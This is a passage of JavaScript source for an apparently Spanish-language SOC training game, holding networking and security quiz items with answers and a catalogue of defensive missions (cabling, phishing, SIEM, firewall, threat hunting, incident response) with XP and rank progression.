      'Denegar todo y permitir solo lo necesario (default deny)',
      'Permitir todo y bloquear lo que moleste',
      'Apagar el firewall en horario laboral',
      'Permitir solo ICMP',
    ],
    a: 0,
    e: 'Default deny + lista blanca reduce la superficie de ataque.',
  },
  {
    q: 'Un archivo llamado "factura.pdf.exe" es sospechoso porque:',
    o: [
      'Usa doble extensión para disfrazar un ejecutable',
      'Los PDF siempre son malware',
      'Pesa demasiado',
      'No tiene nada sospechoso',
    ],
    a: 0,
    e: 'Windows oculta extensiones conocidas por defecto, así que el usuario solo ve "factura.pdf".',
  },
  {
    q: 'Después de cerrar un incidente, la fase de "Lecciones aprendidas" sirve para:',
    o: [
      'Documentar qué pasó y mejorar controles para que no se repita',
      'Buscar culpables y sancionarlos',
      'Borrar los logs del incidente',
      'Nada, es opcional',
    ],
    a: 0,
    e: 'Es la fase que hace madurar al SOC: nuevas reglas en el SIEM, playbooks y capacitación.',
  },
  {
    q: 'En el estándar T568B, ¿qué hilos van en los pines 1 y 2?',
    o: ['Blanco-naranja y naranja', 'Blanco-verde y verde', 'Blanco-azul y azul', 'Blanco-café y café'],
    a: 0,
    e: 'T568B: blanco-naranja, naranja, blanco-verde, azul, blanco-azul, verde, blanco-café, café.',
  },
  {
    q: 'Un PC recibe la IP 169.254.10.20. ¿Qué indica?',
    o: ['El DHCP no respondió y el equipo se autoasignó una APIPA', 'Tiene una IP pública', 'El DNS está caído', 'El firewall lo bloqueó'],
    a: 0,
    e: 'Las direcciones 169.254.x.x son autoasignadas: el primer paso es revisar el enlace y el servidor DHCP.',
  },
  {
    q: 'ping 8.8.8.8 funciona, pero ninguna página web abre por nombre. ¿Qué revisas primero?',
    o: ['El DNS configurado en el equipo', 'El cable de red', 'La ruta por defecto del router', 'La fuente de poder'],
    a: 0,
    e: 'Si responde por IP, hay conectividad. Lo que falla es la resolución de nombres.',
  },
];

// ================================================================
//  Catálogo de misiones (orden = progresión)
// ================================================================
export const MISSIONS = [
  {
    id: 'induccion',
    code: 'M01',
    short: 'Mentora · Inducción',
    station: 'Recepción · Mentora Laura',
    title: 'Inducción al SOC',
    action: 'Hablar con',
    objective: 'Habla con Laura, la mentora, junto a la recepción del lobby.',
    xp: 100,
    brief:
      '¡Bienvenido/a a CyberCorp! Soy Laura, analista Tier 3 y seré tu mentora. Antes de darte acceso al SOC necesito comprobar que tienes claros los conceptos básicos de seguridad.',
    learn: ['Qué es un SOC y cómo se organiza (Tier 1, 2, 3)', 'La tríada CIA', 'Qué es un SIEM', 'Falsos positivos y falsos negativos'],
    debrief: 'Tienes las bases. Te activé el carnet: la puerta del SOC ya está abierta. Ve a la Estación 01.',
    unlockMsg: '🔓 La puerta del SOC se abrió. ¡Entra!',
    render: quiz(Q_INDUCCION, { pass: 0.8 }),
  },
  {
    id: 'redes',
    code: 'M02',
    short: '01 · Redes',
    station: 'Estación 01 · Redes',
    title: 'Fundamentos de redes',
    action: 'Usar',
    objective: 'Entra al SOC y ve a la Estación 01 · Redes (izquierda, primera fila).',
    xp: 150,
    brief: 'No puedes defender una red que no entiendes. Esta estación evalúa puertos, protocolos, modelo OSI y subnetting.',
    learn: ['Puertos comunes (22, 53, 80, 443, 3389)', 'Modelo OSI', 'TCP vs UDP y el three-way handshake', 'Subnetting básico'],
    debrief: 'Dominas la teoría. Ahora, a ensuciarse las manos: cruza la puerta oeste del SOC y entra al Laboratorio de Redes.',
    render: quiz(Q_REDES, { pass: 0.7 }),
  },
  {
    id: 'cableado',
    code: 'L1',
    short: 'L1 · Cableado',
    station: 'Laboratorio · Taller de cableado',
    title: 'Taller de cableado',
    action: 'Usar',
    objective: 'Entra al Laboratorio de Redes por la puerta oeste del SOC y ve al Taller de cableado.',
    xp: 200,
    brief: 'Un técnico de verdad sabe hacer su propio cable. Vas a ponchar un cable directo, probarlo con el tester, convertirlo en cruzado y terminar en un patch panel.',
    learn: ['Herramientas de cableado estructurado', 'Estándares T568A y T568B', 'Pelar, ordenar, recortar y ponchar un RJ45', 'Lectura del tester', 'Herramienta de impacto en patch panel'],
    debrief: 'Tu cable pasó la prueba. Ahora toca usarlo: arma físicamente una red completa.',
    render: cableLab,
  },
  {
    id: 'armado',
    code: 'L2',
    short: 'L2 · Armar red',
    station: 'Laboratorio · Armado de red',
    title: 'Armado físico de la red',
    action: 'Usar',
    objective: 'En el Laboratorio de Redes, ve a la estación de Armado de red.',
    xp: 200,
    wide: true,
    brief: 'Llegaron los equipos a una oficina y ya están configurados, pero nadie los ha conectado. Elige el cable correcto para cada enlace, conecta cada puerto y comprueba con ping.',
    learn: ['Cuándo usar cable directo y cuándo cruzado', 'Puertos LAN y WAN', 'Interpretar los LED de enlace', 'Comprobar con ping'],
    debrief: 'La red física quedó lista. Siguiente reto: instalar una oficina completa, desde cero.',
    render: armadoLab,
  },
  {
    id: 'completo',
    code: 'L3',
    short: 'L3 · Lab completo',
    station: 'Laboratorio · Instalación completa',
    title: 'Lab completo: del encendido al cierre',
    action: 'Usar',
    objective: 'En el Laboratorio de Redes, ve a la estación de Instalación completa.',
    xp: 350,
    wide: true,
    brief: 'Este es el laboratorio grande. Encenderás la UPS y los equipos, pasarás por la BIOS e iniciarás sesión en tu PC. Luego configurarás router, switch, DHCP y NAT, probarás la red, guardarás todo y apagarás correctamente. Tu avance se guarda solo: puedes salir y volver.',
    learn: ['Secuencia de encendido y POST', 'Ajustes de BIOS y orden de arranque', 'Conexión por consola y comandos de router', 'Direccionamiento IP, DHCP y NAT', 'Verificación ordenada y guardado de configuración', 'Apagado correcto'],
    debrief: '¡Montaste una red de oficina completa, de principio a fin! Ahora veamos si también sabes arreglar una que está dañada.',
    render: fullLab,
  },
  {
    id: 'diagnostico',
    code: 'L4',
    short: 'L4 · Diagnóstico',
    station: 'Laboratorio · Mesa de ayuda',
    title: 'Diagnóstico de fallas de red',
    action: 'Usar',
    objective: 'En el Laboratorio de Redes, ve a la Mesa de ayuda y resuelve los tickets.',
    xp: 300,
    wide: true,
    brief: 'Es lunes y la mesa de ayuda está en llamas: seis tickets abiertos en una red que alguien dejó mal configurada. Encuentra la causa de cada falla con las herramientas de diagnóstico y corrígela.',
    learn: ['Método de diagnóstico por capas', 'ipconfig, ping, tracert y nslookup', 'show ip interface brief', 'Puerta de enlace, DNS y subred mal configurados'],
    debrief: 'Tickets cerrados. Ya entiendes cómo funciona la red: ahora defiéndela. Regresa al SOC, porque hay un correo sospechoso.',
    render: diagLab,
  },
  {
    id: 'phishing',
    code: 'M03',
    short: '02 · Phishing',
    station: 'Estación 02 · Correo',
    title: 'Análisis de phishing',
    action: 'Usar',
    objective: 'Regresa al SOC y ve a la Estación 02 · Phishing (centro, primera fila).',
    xp: 150,
    brief: 'Más del 80% de los incidentes empiezan con un correo. Vas a analizar un correo reportado por un usuario y encontrar todos los indicadores de phishing.',
    learn: ['Typosquatting y dominios falsos', 'Ingeniería social (urgencia, miedo)', 'Enlaces engañosos', 'Adjuntos con doble extensión'],
    debrief: 'Detectaste la campaña. Siguiente reto: leer logs como un analista en el SIEM.',
    render: phishing,
  },
  {
    id: 'siem',
    code: 'M04',
    short: '03 · SIEM',
    station: 'Estación 03 · SIEM',
    title: 'Investigación en el SIEM',
    action: 'Usar',
    objective: 'Ve a la Estación 03 · SIEM (derecha, primera fila).',
    xp: 200,
    brief: 'Turno de madrugada. Saltó una alerta de autenticación en el SIEM. Analiza los logs, identifica al atacante y clasifica el incidente.',
    learn: ['Lectura de logs de autenticación', 'Detección de fuerza bruta', 'Asignar severidad', 'Escalamiento'],
    debrief: 'Excelente triage. Ahora hay que cerrarle la puerta al atacante en el firewall.',
    render: siem,
  },
  {
    id: 'firewall',
    code: 'M05',
    short: '04 · Firewall',
    station: 'Estación 04 · Firewall',
    title: 'Contención en el firewall',
    action: 'Usar',
    objective: 'Ve a la Estación 04 · Firewall (derecha, segunda fila).',
    xp: 200,
    brief: 'Con el atacante identificado, toca contenerlo: vas a crear una regla en el firewall perimetral.',
    learn: ['Reglas de firewall (acción, dirección, protocolo, origen, puerto)', 'Equivalencia con iptables', 'Reglas específicas vs. bloqueos amplios'],
    debrief: 'Atacante bloqueado. Pero el EDR detectó algo raro en un equipo de Finanzas… a cazar.',
    render: firewall,
  },
  {
    id: 'hunting',
    code: 'M06',
    short: '05 · Endpoint',
    station: 'Estación 05 · Threat Hunting',
    title: 'Threat hunting en endpoint',
    action: 'Usar',
    objective: 'Ve a la Estación 05 · Endpoint (centro, segunda fila).',
    xp: 250,
    brief: 'Vas a conectarte por consola a un equipo comprometido y usar comandos reales de Windows para encontrar y eliminar un malware.',
    learn: ['netstat -ano', 'tasklist', 'taskkill', 'Detección de procesos que imitan nombres legítimos', 'Conexiones C2'],
    debrief: 'Cazaste el malware. Pero el ataque escaló a ransomware: necesitamos un plan de respuesta.',
    render: hunting,
  },
  {
    id: 'ir',
    code: 'M07',
    short: '06 · Incidentes',
    station: 'Estación 06 · Respuesta a Incidentes',
    title: 'Respuesta a incidentes',
    action: 'Usar',
    objective: 'Ve a la Estación 06 · Incidentes (izquierda, segunda fila).',
    xp: 250,
    brief: 'El ransomware llegó. Vas a liderar la respuesta: primero el plan, luego las decisiones.',
    learn: ['Ciclo de respuesta: Preparación → Lecciones aprendidas', 'Contención de ransomware', 'Cadena de custodia'],
    debrief: '¡Incidente controlado! Estás listo/a para el examen final con el Director del SOC.',
    render: incident,
  },
  {
    id: 'examen',
    code: 'M08',
    short: 'Director · Examen',
    station: 'Director del SOC',
    title: 'Examen final de certificación',
    action: 'Hablar con',
    objective: 'Presenta el examen final con el Director, frente al video wall.',
    xp: 300,
    brief:
      'Has pasado por todas las estaciones. Ahora 10 preguntas aleatorias de todo el programa. Necesitas 70% para obtener tu certificado de Ingeniero/a SOC.',
    learn: ['Todo lo visto en el programa', '10 preguntas aleatorias', 'Mínimo 7 correctas'],
    debrief: '¡Felicitaciones! Aprobaste el programa. Aquí está tu certificado.',
    render: quiz(Q_EXAMEN, { pass: 0.7, pick: 10 }),
  },
];

// Estaciones siempre disponibles: no dan XP ni cuentan para el progreso.
export const EXTRAS = [
  {
    id: 'sandbox',
    code: 'LIBRE',
    short: 'Laboratorio libre',
    station: 'Laboratorio · Modo libre',
    title: 'Laboratorio libre y retos',
    action: 'Usar',
    wide: true,
    brief: 'Tu propio entorno de práctica. Crea una red desde cero con los equipos que quieras o elige un reto de VLAN, rutas estáticas o DHCP.',
    learn: ['Diseña y prueba tus propias topologías', 'VLAN y router-on-a-stick', 'Enrutamiento estático', 'Servidor DHCP'],
    render: sandbox,
  },
];

export const TOTAL_XP = MISSIONS.reduce((s, m) => s + m.xp, 0);

export function rankFor(n) {
  if (n >= MISSIONS.length) return 'Ingeniero/a SOC Certificado/a';
  if (n >= 10) return 'Analista SOC Tier 3 · Threat Hunter';
  if (n >= 8) return 'Analista SOC Tier 2';
  if (n >= 7) return 'Analista SOC Tier 1';
  if (n >= 6) return 'Técnico/a de Redes';
  if (n >= 3) return 'Técnico/a de Redes Junior';
  if (n >= 1) return 'Analista Trainee';
  return 'Pasante';
}
